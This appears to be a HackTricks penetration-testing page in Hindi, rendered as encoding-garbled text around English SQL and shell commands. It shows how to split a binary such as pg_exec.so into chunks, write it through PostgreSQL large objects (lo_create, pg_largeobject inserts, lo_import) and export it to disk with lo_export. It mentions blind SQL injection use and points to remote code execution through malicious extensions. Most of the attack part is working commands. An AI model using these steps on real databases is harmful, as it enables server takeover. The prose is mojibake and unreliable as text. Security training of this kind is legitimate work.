```bash
split -b 2048 your_binary
```

рдпрд╣ рдЖрдкрдХреЗ рдмрд╛рдЗрдирд░реА рдлрд╛рдЗрд▓ рдХреЛ 2KB рдХреЗ рдЯреБрдХрдбрд╝реЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░ рджреЗрдЧрд╛ред

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдпреЗ рдЯреБрдХрдбрд╝реЗ рд╣реЛрдВ, рддреЛ рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ PostgreSQL рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдбрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдбреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

```sql
SELECT lo_create(0);
```

рдпрд╣ рдПрдХ рдирдпрд╛ LOID рдмрдирд╛рдПрдЧрд╛ред

```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (12345, 0, decode('your_hex_encoded_chunk', 'hex'));
```

рдпрд╣ рдЖрдкрдХреЗ рдЪрдВрдХ рдХреЛ рдмрдирд╛рдП рдЧрдП LOID рдХреЗ рд╕рд╛рде рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдбрд╛рд▓реЗрдЧрд╛ред рдЖрдкрдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдЪрдВрдХ рдХреЗ рд▓рд┐рдП `pageno` рдХреЛ рдмрдврд╝рд╛рдирд╛ рд╣реЛрдЧрд╛ред

рдЕрдВрдд рдореЗрдВ, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдлрд╛рдЗрд▓ рдХреЛ рд╡рд╛рдкрд╕ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ:

```sql
SELECT lo_export(12345, '/tmp/your_binary');
```

рдпрд╣ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдлрд╛рдЗрд▓ рдХреЛ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╡рд╛рдкрд╕ рдирд┐рдХрд╛рд▓реЗрдЧрд╛ред
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рдкреНрд░рддреНрдпреЗрдХ рдлрд╛рдЗрд▓ рдХреЛ Base64 рдпрд╛ Hex рдореЗрдВ рдПрдиреНрдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
рдЗрд╕рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛рддреЗ рд╕рдордп рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдЖрдкрдХреЛ **2KB рдХреЗ рд╕реНрдкрд╖реНрдЯ-рдкрд╛рда рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рдЪрдВрдХреНрд╕** рднреЗрдЬрдиреЗ рд╣реЛрдВрдЧреЗ (2KB рдХреЗ base64 рдпрд╛ hex encoded рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рдирд╣реАрдВ)ред рдпрджрд┐ рдЖрдк рдЗрд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **hex encoded** рдлрд╛рдЗрд▓ рдХрд╛ рдЖрдХрд╛рд░ **рджреЛрдЧреБрдирд╛** рд╣реЛрддрд╛ рд╣реИ (рдлрд┐рд░ рдЖрдкрдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдЪрдВрдХ рдХреЗ рд▓рд┐рдП 4KB рдХрд╛ encoded рдбреЗрдЯрд╛ рднреЗрдЬрдирд╛ рд╣реЛрдЧрд╛) рдФрд░ **base64** encoded рдлрд╛рдЗрд▓ рдХрд╛ рдЖрдХрд╛рд░ `ceil(n / 3) * 4` рд╣реЛрддрд╛ рд╣реИред
{% endhint %}

рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбреАрдмрдЧ рдХрд░рддреЗ рд╕рдордп рдЖрдк рдмрдирд╛рдП рдЧрдП рдмрдбрд╝реЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреА рд╕рд╛рдордЧреНрд░реА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# lo\_creat рдФрд░ Base64 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ рдПрдХ LOID рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдмрд╛рдЗрдирд░реА рдбреЗрдЯрд╛ рдХреЛ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛:
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
рдпрджрд┐ рдЖрдк **Blind SQLinjection** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк `lo_create` рдХрд╛ рдЙрдкрдпреЛрдЧ **рдирд┐рд╢реНрдЪрд┐рдд LOID** рдХреЗ рд╕рд╛рде рдХрд░рдиреЗ рдореЗрдВ рдЕрдзрд┐рдХ рд░реБрдЪрд┐ рд░рдЦреЗрдВрдЧреЗ рддрд╛рдХрд┐ рдЖрдк **рдЬрд╛рди рд╕рдХреЗрдВ рдХрд┐** рдЖрдкрдХреЛ **рдХрд╣рд╛рдБ** **рд╕рд╛рдордЧреНрд░реА** **рдЕрдкрд▓реЛрдб** рдХрд░рдиреА рд╣реИред\
рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЛрдИ рд╕рд┐рдВрдЯреИрдХреНрд╕ рддреНрд░реБрдЯрд┐ рдирд╣реАрдВ рд╣реИ, рдлрдВрдХреНрд╢рдиреНрд╕ `lo_creat` рдФрд░ `lo_create` рд╣реИрдВред

LOID рдХрд╛ рдЙрдкрдпреЛрдЧ `pg_largeobject` рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред `pg_largeobject` рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ 2KB рдХреЗ рдЖрдХрд╛рд░ рдХреЗ рдЪрдВрдХреНрд╕ рдбрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
рдЕрдВрдд рдореЗрдВ рдЖрдк рдлрд╛рдЗрд▓ рдХреЛ рдлрд╛рдЗрд▓-рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рджреМрд░рд╛рди рдкреНрд░рдпреБрдХреНрдд LOID `173454` рдерд╛):
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
рдирд╡реАрдирддрдо postgres рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдХрд┐рд╕реА рднреА рдкрде рдХрд╛ рд╕рдВрдХреЗрдд рджрд┐рдП рдмрд┐рдирд╛ **extensions рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ**ред [**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрдврд╝реЗрдВ**ред](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

рдЖрдкрдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдмрдирд╛рдИ рдЧрдИ рдмрдбрд╝реА рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рд╣рдЯрд╛рдиреЗ рдореЗрдВ рд░реБрдЪрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИ:
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# lo_import рдФрд░ Hex рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ lo_import рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдмрдбрд╝реА рдСрдмреНрдЬреЗрдХреНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рд╕реМрднрд╛рдЧреНрдп рд╕реЗ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк LOID рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдФрд░ рдирд╣реАрдВ рднреА рдХрд░ рд╕рдХрддреЗ) рдЬрд┐рд╕реЗ рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ:
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж рдЖрдк рдкреНрд░рддреНрдпреЗрдХ рдкреЗрдЬ рдкрд░ рдбреЗрдЯрд╛ рдбрд╛рд▓рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╛рдж рд░рдЦреЗрдВ, рдЖрдкрдХреЛ 2KB рдХреЗ рдЪрдВрдХреНрд╕ рдореЗрдВ рдбреЗрдЯрд╛ рдбрд╛рд▓рдирд╛ рд╣реЛрдЧрд╛):
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
HEX рдХреЗрд╡рд▓ рд╣реЗрдХреНрд╕ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдмрд┐рдирд╛ `0x` рдпрд╛ `\x` рдХреЗ), рдЙрджрд╛рд╣рд░рдг:
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
рдЕрдВрдд рдореЗрдВ, рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рдлрд╛рдЗрд▓ рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХрд░реЗрдВ рдФрд░ рдмрдбрд╝реЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рд╣рдЯрд╛ рджреЗрдВ:
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЖрдкрдХреЛ **рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХреЛ рдХрд┐рд╕реА рднреА рдкрде рдХрд╛ рд╕рдВрдХреЗрдд рджрд┐рдП рдмрд┐рдирд╛ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИ**. [**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрдврд╝реЗрдВ**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# рд╕реАрдорд╛рдПрдБ

PostgreSQL рдореЗрдВ рдмрдбрд╝реА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдмрдбрд╝реА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ ACL рд╣реЛ рд╕рдХрддрд╛ рд╣реИ** (рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ рд▓рд┐рд╕реНрдЯ). рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдирдИ рдмрдбрд╝реА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рддрд╛рдХрд┐ рдЖрдкрдХрд╛ рдпреВрдЬрд╝рд░ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд░рдЦрддрд╛ рд╣реЛ** рдЙрдиреНрд╣реЗрдВ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП, рднрд▓реЗ рд╣реА рд╡реЗ рдЖрдкрдХреЗ рдпреВрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП рд╣реЛрдВ.

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рдкреБрд░рд╛рдиреА рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдПрдХ ACL рд╣реЛ рдЬреЛ рд╡рд░реНрддрдорд╛рди рдпреВрдЬрд╝рд░ рдХреЛ рдЗрд╕реЗ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реЛ**, рддрдм рд╣рдо рдЙрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ.


<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>
